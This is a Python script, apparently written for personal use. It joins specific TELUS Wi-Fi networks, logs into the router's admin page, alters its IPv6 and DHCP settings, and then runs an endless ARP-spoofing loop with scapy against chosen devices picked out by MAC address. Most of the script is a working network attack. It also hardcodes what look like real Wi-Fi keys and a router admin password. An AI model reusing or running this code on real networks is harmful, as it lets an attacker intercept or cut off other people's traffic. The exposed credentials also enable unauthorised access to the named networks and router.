import pywifi
import time
from pywifi import const
from scapy.all import *
dics=[]
dics_2=[]
###########################--WiFi_connection--###########################
def connect_wifi():
    global dics
    global dics_2
    os.system("ifconfig wlan0 down")
    os.system("ifconfig wlan0 up")
    wifi = pywifi.PyWiFi()  # 创建一个wifi对象
    ifaces = wifi.interfaces()[1]  # 取第一个无限网卡
    print(ifaces.name())  # 输出无线网卡名称
    ifaces.disconnect()  # 断开网卡连接
    time.sleep(3)  # 缓冲3秒
    profile = pywifi.Profile()  # 配置文件
    profile.ssid = "TELUSWiFi0421"  # wifi名称
    profile.auth = const.AUTH_ALG_OPEN  # 需要密码
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # 加密类型
    profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
    profile.key = 'eQPm4QtXrx'  #wifi密码
    ifaces.remove_all_network_profiles()  # 删除其他配置文件
    tmp_profile = ifaces.add_network_profile(profile)  # 加载配置文件
    ifaces.connect(tmp_profile)  # 连接
    time.sleep(5)
    print("[*]status:",ifaces.status())
    if ifaces.status() != const.IFACE_CONNECTED:
        profile = pywifi.Profile()  # 配置文件
        profile.ssid = "TELUS1773"  # wifi名称
        profile.auth = const.AUTH_ALG_OPEN  # 需要密码
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  # 加密类型
        profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
        profile.key = '9nnx6aq94j'  #wifi密码
        ifaces.remove_all_network_profiles()  # 删除其他配置文件
        tmp_profile = ifaces.add_network_profile(profile)  # 加载配置文件
        ifaces.connect(tmp_profile)  # 连接
        time.sleep(5)
        pass
        if ifaces.status() != const.IFACE_CONNECTED:
            connect_wifi()
        else:
            print("[*]OK!")
            try:
                os.system("dhclient")
                sessionKey=login()
                db()
                ip_con()
                dics,dics_2=get_all_mac()
                return
            except:
                return
        connect_wifi()
    else:
        print("[*]OK!")
        try:
            os.system("dhclient")
            sessionKey=login()
            db()
            ip_con()
            dics,dics_2=get_all_mac()
            return
        except:
            pass
###########################--Get_all_Mac--###########################
import threading
import os
from subprocess import *
from time import sleep
def pings(host):
    cmd="ping -c 10 "+str(host)
    output=call(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
def get_all_mac():
    print("[*]Getting MAC!")
    dics=[]
    dics_2=[]
    ip_base="192.168.1."
    threads = []
    for i in range(60,91):
        t = threading.Thread(target=pings, args=(ip_base+str(i),))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    os.system('arp -a > temp.txt')
    with open('temp.txt') as fp:
        for line in fp:
            line = line.split()
            try:
                mac=line[3]
                if mac== "cc:c0:79:52:7b:52" or mac=="20:c9:d0:7a:a4:b5" or mac=="6c:40:08:c1:ce:7e":
                    dics.append([mac,line[1].replace(")","").replace("(","")])
                    print(dics)
                elif mac=="4c:0b:be:29:46:fe":
                    dics_2.append([mac,line[1].replace(")","").replace("(","")])
            except:
                pass
    print("[*]Getting MAC Finished!")
    return dics,dics_2
###########################--GateWay_Website_Control--###########################
import time
import requests
import re
import os
url = "http://192.168.1.254"
url_home = "http://192.168.1.254/index.html"
loginurl = url + "/login.cgi"
logouturl = url + "/logout.cgi"
session = requests.Session()


def get_sessionKey():
    response = session.get(url_home,timeout=10)
    index_html = response.text
    sessionKey = re.findall("var sessionKey = '(.*?)';", index_html)[0]
    return sessionKey


def login():
    print("[*]Login...!")
    sessionKey = get_sessionKey()
    """Change to your password there"""
    login_data = {
        "inputUserName": "admin",
        "inputPassword": "yb7gk7xn",
        "sessionKey": sessionKey
    }
    response = session.post(loginurl, data=login_data,timeout=10)
    cookie = session.cookies.get_dict()
    if "err" in response.text:
        print("[*]Wrong Username/Password...!")
        os._exit(0)
    else:
        print("[*]Login success!")
    print("[*]status_code:", response.status_code)


def db():
    print("[*]Unblocking...!")
    db_url = "http://192.168.1.254/ipv6_wansetting.cgi"
    sessionKey = get_sessionKey()
    db_data = {"ipv6_enable": "0", "sessionKey": sessionKey}
    response = session.post(db_url, data=db_data,timeout=10)
    if "After new settings are applied" in response.text:
        print("[*]Unblcok Success!")
    else:
        print("[*]Unblock Failed...!")
    print("[*]status_code:", response.status_code)
def ip_con():
    print("[*]Unblocking...!")
    db_url = "http://192.168.1.254/advancedsetup_lanipdhcpsettings.cgi"
    sessionKey = get_sessionKey()
    db_data = {"dhcpEthStart": "192.168.1.64","dhcpEthEnd":"192.168.1.90", "sessionKey": sessionKey}
    response = session.post(db_url, data=db_data,timeout=10)
    if "After new settings are applied" in response.text:
        print("[*]Unblcok Success!")
    else:
        print("[*]Unblock Failed...!")
    print("[*]status_code:", response.status_code)
###########################--ARP_Spoof--###########################
def arp_spoofs(dics):
    your_mac = "5c:51:4f:b1:3e:56"
    gateway_ip = "192.168.1.254"
    gateway_mac = "4c:8b:30:16:c4:c0"
    for k in range(1):
        for i in dics:
            target_ip = i[1]
            target_mac = i[0]
            poison_target = ARP()
            poison_target.op = 2
            poison_target.psrc = gateway_ip
            poison_target.pdst = target_ip
            poison_target.hwsrc = your_mac
            poison_target.hwdst = target_mac
            poison_gateway = ARP()
            poison_gateway.op = 2
            poison_gateway.psrc = target_ip
            poison_gateway.pdst = gateway_ip
            poison_gateway.hwsrc = your_mac
            poison_gateway.hwdst = gateway_mac
            ether_gateway=Ether(dst=gateway_mac,src=your_mac)
            ether_target=Ether(dst=target_mac,src=your_mac)
            try:
                send(poison_gateway)
                send(poison_target)
                print("[*]Sending->",i)
            except:
                return
###########################--Main--###########################
connect_wifi()
if __name__ == "__main__":
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[1]
    dics,dics_2=get_all_mac()
    count=0
    while 1:
        count+=1
        print("[*]Count:",count)
        count%=3000
        if ifaces.status() == const.IFACE_CONNECTED and count!=2999:
            if(dics!=[]):
                print("\n[*]##############################\n")
                arp_spoofs(dics)
                print("\n[*]##############################\n")
            else:
                print("[*]Nothing To Do With dics")
            if(dics_2!=[] and count%100>70):
                print("\n[*]##############################\n")
                arp_spoofs(dics_2)
                print("\n[*]##############################\n")
            else:
                print("[*]Nothing To Do With dics_2")
        else:
            connect_wifi()
